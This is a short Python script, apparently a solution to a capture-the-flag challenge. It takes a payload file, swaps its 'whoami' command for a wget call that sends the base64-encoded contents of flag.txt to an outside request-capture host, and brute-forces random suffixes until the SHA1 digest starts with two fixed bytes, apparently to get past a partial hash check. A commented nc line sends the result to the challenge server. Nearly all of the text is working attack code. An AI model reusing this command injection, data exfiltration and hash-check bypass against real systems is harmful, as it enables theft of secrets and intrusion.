from Crypto.Hash import SHA1
import os
from icecream import ic

with open('test.load', 'rb') as fh:
    test_load = fh.read()

test_load_hash = SHA1.new(test_load).digest()
ic(test_load_hash.hex())

modified1 = test_load.replace(b'whoami', b'wget https://eoibtsmej5g1snf.m.pipedream.net/ --header "Yeet: $(cat flag.txt | base64 -w 0)"')
modified2 = modified1

while SHA1.new(modified2).digest()[:2] != b'\x60\x00':
    modified2 = modified1 + os.urandom(16)

with open('solution.load', 'wb') as fh:
    fh.write(modified2)


# cat solution.load | nc -w 1 austiccquals.cyber.uq.edu.au 4630
